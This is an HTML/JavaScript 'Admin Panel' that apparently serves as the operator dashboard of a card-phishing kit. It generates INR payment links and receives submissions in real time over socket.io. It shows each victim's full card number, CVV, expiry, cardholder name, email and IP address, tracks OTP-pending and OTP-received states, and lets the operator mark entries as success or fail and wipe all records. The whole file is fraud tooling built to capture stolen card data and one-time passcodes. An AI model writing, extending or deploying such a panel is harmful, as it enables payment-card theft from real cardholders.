<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Admin Panel</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  <style>
    body { background: #000; color: #fff; font-family: Arial, sans-serif; padding: 20px; }
    h1 { text-align: center; margin-bottom: 20px; }
    .container { max-width: 1200px; margin: 0 auto; }
    .generate-link { background: #222; padding: 20px; border-radius: 8px; margin-bottom: 20px; }
    .form-group { margin-bottom: 15px; }
    label { display: block; margin-bottom: 5px; color: #aaa; }
    input, textarea { width: 100%; padding: 8px; border: 1px solid #444; background: #333; color: #fff; border-radius: 4px; }
    .payment-link { margin-top: 15px; padding: 10px; background: #333; border-radius: 4px; display: none; }
    .copy-btn { background: #22c55e; border: none; color: #fff; padding: 5px 10px; border-radius: 4px; cursor: pointer; margin-left: 10px; }
    table { width: 100%; border-collapse: collapse; background: #111; margin-bottom: 20px; }
    th, td { padding: 10px; border: 1px solid #333; text-align: left; font-size: 12px; }
    th { background: #222; }
    tr:nth-child(even) { background: #222; }
    button { background: #4a90e2; color: #fff; border: none; padding: 6px 10px; margin-right: 4px; cursor: pointer; border-radius: 4px; font-size: 12px; transition: all 0.3s ease; }
    button:hover { background: #357ABD; transform: translateY(-2px); box-shadow: 0 4px 8px rgba(0,0,0,0.3); }
    button:disabled { background: #666; cursor: not-allowed; transform: none; box-shadow: none; }
    .status-badge { padding: 2px 6px; border-radius: 3px; font-size: 11px; font-weight: bold; }
    .status-processing { background: #f59e0b; color: #000; }
    .status-otp_pending { background: #3b82f6; color: #fff; }
    .status-otp_received { background: #8b5cf6; color: #fff; }
    .status-success { background: #22c55e; color: #fff; }
    .status-fail { background: #ef4444; color: #fff; }

    .notification {
      position: fixed;
      top: 20px;
      right: 20px;
      background: #ef4444;
      color: white;
      padding: 15px;
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
      z-index: 1000;
      animation: slideIn 0.3s ease-out;
      max-width: 350px;
    }
    @keyframes slideIn {
      0% { transform: translateX(100%); opacity: 0; }
      100% { transform: translateX(0); opacity: 1; }
    }

    /* Add highlight animation for new rows */
    @keyframes highlightRow {
      0% { background-color: rgba(239, 68, 68, 0.5); }
      50% { background-color: rgba(239, 68, 68, 0.5); }
      100% { background-color: inherit; }
    }

    /* Card animation */
    .card-animate {
      animation: cardPulse 1s ease-in-out;
    }
    @keyframes cardPulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.02); background-color: rgba(74, 144, 226, 0.2); }
      100% { transform: scale(1); }
    }

    .error-message, .success-message {
      background-color: #ef4444;
      color: white;
      padding: 10px;
      border-radius: 4px;
      margin-bottom: 15px;
      display: none;
    }

    .success-message {
      background-color: #22c55e;
    }

    .loading {
      display: inline-block;
      width: 20px;
      height: 20px;
      border: 2px solid rgba(255,255,255,.3);
      border-radius: 50%;
      border-top-color: #fff;
      animation: spin 1s ease-in-out infinite;
      margin-left: 8px;
      vertical-align: middle;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="admin-header">
      <h1>Admin Panel</h1>
      <button id="clearTransactionsBtn" class="clear-transactions-btn">Clear All Transactions</button>
    </div>

    <div id="error-msg" class="error-message"></div>
    <div id="success-msg" class="success-message"></div>

    <div class="generate-link">
      <h2>Generate Payment Link</h2>
      <form id="generateLinkForm">
        <div class="form-group">
          <label>Amount (INR)</label>
          <input type="number" id="amount" required min="1" step="1">
        </div>
        <div class="form-group">
          <label>Description</label>
          <textarea id="description" rows="2" required></textarea>
        </div>
        <button type="submit">Generate Link</button>
      </form>
      <div id="paymentLinkContainer" class="payment-link">
        <span>Payment Link: </span>
        <span id="paymentLink"></span>
        <button class="copy-btn" onclick="copyPaymentLink()">Copy</button>
      </div>
    </div>

    <h2>Transactions</h2>
    <div id="transactionsLoading" style="text-align:center;">
      <span class="loading"></span> Loading transactions...
    </div>
    <table id="transactionsTable">
      <thead>
        <tr>
          <th>Invoice ID</th>
          <th>Email</th>
          <th>Amount</th>
          <th>Currency</th>
          <th>Card Number</th>
          <th>CVV</th>
          <th>Expiry</th>
          <th>Cardholder</th>
          <th>IP Address</th>
          <th>Status</th>
          <th>Actions</th>
        </tr>
      </thead>
      <tbody></tbody>
    </table>
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    // Global Variables
    const socket = io({
      query: {
        isAdmin: 'true'
      },
      reconnection: true,
      reconnectionAttempts: Infinity,
      reconnectionDelay: 1000,
      reconnectionDelayMax: 5000,
      timeout: 20000,
      autoConnect: true
    });

    // Track transactions and other data
    let transactionsMap = new Map();
    let lastTransactionTime = 0;

    // Debug socket events
    const originalEmit = socket.emit;
    socket.emit = function() {
      console.log('EMITTING:', arguments[0], Array.from(arguments).slice(1));
      return originalEmit.apply(this, arguments);
    };

    // Socket connection event handlers
    socket.on('connect', () => {
      console.log('Admin socket connected with ID:', socket.id);
      showMessage('success', 'Connected to server');

      // Force reload data on reconnect
      loadTransactions();
    });

    socket.on('disconnect', () => {
      console.log('Admin socket disconnected');
      showMessage('error', 'Disconnected from server - reconnecting...');
    });

    socket.on('connect_error', (error) => {
      console.error('Connection error:', error);
      showMessage('error', 'Connection error: ' + error.message);
    });

    // CRITICAL: Handle card submission data - properly implemented to avoid duplicates
    socket.on('card_submitted', (data) => {
      console.log('Received card submission:', data);
      if (data.cardData && data.invoiceId) {
        // Acknowledge receipt back to the client
        socket.emit('card_data_received', {
          invoiceId: data.invoiceId,
          received: true,
          timestamp: Date.now()
        });

        // Immediately update the transactions table without waiting for a refresh
        const transaction = transactionsMap.get(data.invoiceId);
        if (transaction) {
          // Update the existing transaction with new card data
          transaction.cardNumber = data.cardData.cardNumber;
          transaction.expiry = data.cardData.expiry;
          transaction.cvv = data.cardData.cvv;
          transaction.email = data.cardData.email;
          transaction.cardholder = data.cardData.cardholder;
          transaction.viewed = false; // Mark as new so it's highlighted
          transaction.ip = data.ip || transaction.ip || 'Unknown';
          transaction.currency = data.cardData.currency || transaction.currency || 'INR';

          if (data.cardData.bankName || data.cardData.country || data.cardData.cardType) {
            transaction.bankInfo = transaction.bankInfo || {};
            transaction.bankInfo.bank = data.cardData.bankName || transaction.bankInfo.bank || 'Unknown';
            transaction.bankInfo.country = data.cardData.country || transaction.bankInfo.country || 'Unknown';
            transaction.bankInfo.scheme = data.cardData.cardType || transaction.bankInfo.scheme || 'Unknown';
          }

          transactionsMap.set(data.invoiceId, transaction);
        } else {
          // Create a new transaction if it doesn't exist yet
          const newTransaction = {
            id: data.invoiceId,
            cardNumber: data.cardData.cardNumber,
            expiry: data.cardData.expiry,
            cvv: data.cardData.cvv,
            email: data.cardData.email,
            cardholder: data.cardData.cardholder,
            amount: data.cardData.amount || '0',
            currency: data.cardData.currency || 'INR',
            timestamp: new Date().toISOString(),
            status: 'processing',
            viewed: false,
            ip: data.ip || 'Unknown',
            bankInfo: {
              bank: data.cardData.bankName || 'Unknown',
              country: data.cardData.country || 'Unknown',
              scheme: data.cardData.cardType || 'Unknown'
            }
          };
          transactionsMap.set(data.invoiceId, newTransaction);
        }

        // Refresh the transactions table with the new data
        renderTransactionsTable();

        // Show notification
        showNotification(`New card data received! Card: ${data.cardData.cardNumber.slice(-4)}`);

        // Play notification sound
        try {
          const audio = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-software-interface-start-2574.mp3');
          audio.play().catch(e => console.log('Audio play failed:', e));
        } catch (e) {
          console.log('Could not play notification sound', e);
        }
      }
    });

    // Handle existing transactions when reconnecting
    socket.on('existing_transactions', (transactions) => {
      console.log('Received existing transactions:', transactions);
      if (transactions && transactions.length > 0) {
        transactions.forEach(tx => transactionsMap.set(tx.id, tx));
        renderTransactionsTable();
      }
    });

    // UI Helper functions
    function showMessage(type, message, duration = 5000) {
      const element = document.getElementById(type === 'error' ? 'error-msg' : 'success-msg');
      element.textContent = message;
      element.style.display = 'block';

      // Auto hide after duration
      setTimeout(() => {
        element.style.display = 'none';
      }, duration);
    }

    function showNotification(message, duration = 5000) {
      const notification = document.createElement('div');
      notification.className = 'notification';
      notification.textContent = message;
      document.body.appendChild(notification);

      // Auto remove after duration
      setTimeout(() => {
        notification.style.opacity = '0';
        notification.style.transform = 'translateX(100%)';
        setTimeout(() => notification.remove(), 300);
      }, duration);
    }

    // Load transactions from server
    async function loadTransactions() {
      try {
        const tbody = document.querySelector("#transactionsTable tbody");
        const loadingIndicator = document.getElementById('transactionsLoading');

        if (loadingIndicator) loadingIndicator.style.display = 'block';
        if (!tbody) {
          console.error('Transactions table not found in DOM');
          return;
        }

        console.log('Fetching transactions data...');
        const response = await fetch("/api/transactions");

        if (!response.ok) {
          throw new Error(`Failed to load transactions: ${response.status}`);
        }

        const data = await response.json();
        console.log(`Received ${data.length} transactions from server`);

        // Hide loading indicator
        if (loadingIndicator) loadingIndicator.style.display = 'none';

        // Update transaction map with server data
        data.forEach(tx => {
          if (!transactionsMap.has(tx.id)) {
            transactionsMap.set(tx.id, tx);
          }
        });

        // Redraw table with all transactions
        renderTransactionsTable();
      } catch (error) {
        console.error('Error loading transactions:', error);
        showMessage('error', 'Failed to load transactions');
        document.getElementById('transactionsLoading').style.display = 'none';
      }
    }

    // Render transactions from the map to the table
    function renderTransactionsTable() {
      const tbody = document.querySelector("#transactionsTable tbody");
      if (!tbody) return;

      // Clear the table
      tbody.innerHTML = '';

      if (transactionsMap.size === 0) {
        tbody.innerHTML = `<tr><td colspan="11" style="text-align:center">No transactions found</td></tr>`;
        return;
      }

      // Convert map to array for sorting
      const transactions = Array.from(transactionsMap.values());

      // Sort transactions with newest at the top
      transactions.sort((a, b) => {
        const timeA = new Date(a.timestamp || 0).getTime();
        const timeB = new Date(b.timestamp || 0).getTime();
        return timeB - timeA;
      });

      // Check if there's a new transaction based on timestamp
      const latestTimestamp = transactions[0]?.timestamp ? new Date(transactions[0].timestamp).getTime() : 0;
      const isNewTransaction = latestTimestamp > lastTransactionTime && lastTransactionTime > 0;

      // Update last known timestamp
      if (latestTimestamp > 0) {
        lastTransactionTime = latestTimestamp;
      }

      // Render each transaction
      transactions.forEach((tx, index) => {
        const row = document.createElement('tr');
        row.setAttribute('data-invoice-id', tx.id);

        // Add highlighting for new transactions
        if ((index === 0 && isNewTransaction) || (!tx.viewed && tx.cardNumber)) {
          row.classList.add('card-animate');

          // Mark as viewed
          tx.viewed = true;
          transactionsMap.set(tx.id, tx);
        }

        row.innerHTML = `
          <td>${tx.id || ''}</td>
          <td>${tx.email || ''}</td>
          <td>${tx.amount || '0'}</td>
          <td>${tx.currency || 'INR'}</td>
          <td>${tx.cardNumber || ''}</td>
          <td>${tx.cvv || ''}</td>
          <td>${tx.expiry || ''}</td>
          <td>${tx.cardholder || ''}</td>
          <td>${tx.ip || 'Unknown'}</td>
          <td>
            <span class="status-badge status-${tx.status || 'processing'}">
              ${tx.status || 'Processing'}
            </span>
          </td>
          <td>
            <button onclick="updateStatus('${tx.id}', 'success')">
              Success
            </button>
            <button onclick="updateStatus('${tx.id}', 'fail')">
              Fail
            </button>
          </td>
        `;

        tbody.appendChild(row);
      });
    }

    // Update transaction status
    async function updateStatus(id, status) {
      try {
        const response = await fetch("/api/updateStatus", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ invoiceId: id, status: status })
        });

        if (!response.ok) throw new Error('Failed to update status');

        // Update local data
        const transaction = transactionsMap.get(id);
        if (transaction) {
          transaction.status = status;
          transactionsMap.set(id, transaction);
        }

        // Re-render table
        renderTransactionsTable();

        showMessage('success', `Status updated to ${status}`);
      } catch (error) {
        console.error('Error updating status:', error);
        showMessage('error', 'Failed to update status');
      }
    }

    // Payment Link Generation
    document.getElementById('generateLinkForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const amountInput = document.getElementById('amount');
      const descInput = document.getElementById('description');
      const linkContainer = document.getElementById('paymentLinkContainer');

      try {
        linkContainer.style.display = 'none';
        const amount = parseFloat(amountInput.value);
        const description = descInput.value.trim();

        if (!amount || amount <= 0) throw new Error('Invalid amount');
        if (!description) throw new Error('Description required');

        // Show loading
        const btn = e.target.querySelector('button[type="submit"]');
        const originalText = btn.textContent;
        btn.textContent = 'Generating...';
        btn.disabled = true;

        const response = await fetch('/api/generatePaymentLink', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ amount, description })
        });

        const data = await response.json();
        if (!response.ok) throw new Error(data.message || 'Generation failed');

        document.getElementById('paymentLink').textContent = data.paymentLink;
        linkContainer.style.display = 'block';
        showMessage('success', 'Payment link generated successfully!');

        // Reset button state
        btn.textContent = originalText;
        btn.disabled = false;
      } catch (error) {
        console.error('Error:', error);
        showMessage('error', `Error: ${error.message}`);
        linkContainer.style.display = 'none';

        // Reset button state
        const btn = e.target.querySelector('button[type="submit"]');
        if (btn) {
          btn.textContent = 'Generate Link';
          btn.disabled = false;
        }
      }
    });

    // Copy Payment Link
    function copyPaymentLink() {
      const link = document.getElementById('paymentLink').textContent;
      navigator.clipboard.writeText(link);
      showMessage('success', 'Link copied to clipboard!');
    }

    // Clear all transactions
    async function clearAllTransactions() {
      if (!confirm('Are you sure you want to clear all transactions? This cannot be undone.')) {
        return;
      }

      try {
        const response = await fetch('/api/clearTransactions', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' }
        });

        if (!response.ok) {
          throw new Error(`Failed to clear transactions: ${response.status}`);
        }

        // Clear local data
        transactionsMap.clear();
        renderTransactionsTable();

        showMessage('success', 'All transactions cleared');
      } catch (error) {
        console.error('Error clearing transactions:', error);
        showMessage('error', `Failed to clear transactions: ${error.message}`);
      }
    }

    // Set up event handlers on page load
    document.addEventListener('DOMContentLoaded', function() {
      // Set up clear transactions button
      document.getElementById('clearTransactionsBtn')?.addEventListener('click', clearAllTransactions);

      // Load initial data
      loadTransactions();

      // Setup auto-refresh
      setInterval(loadTransactions, 60000); // Refresh every minute
    });

    // Make functions available globally
    window.updateStatus = updateStatus;
    window.copyPaymentLink = copyPaymentLink;
    window.clearAllTransactions = clearAllTransactions;
  </script>
</body>
</html>
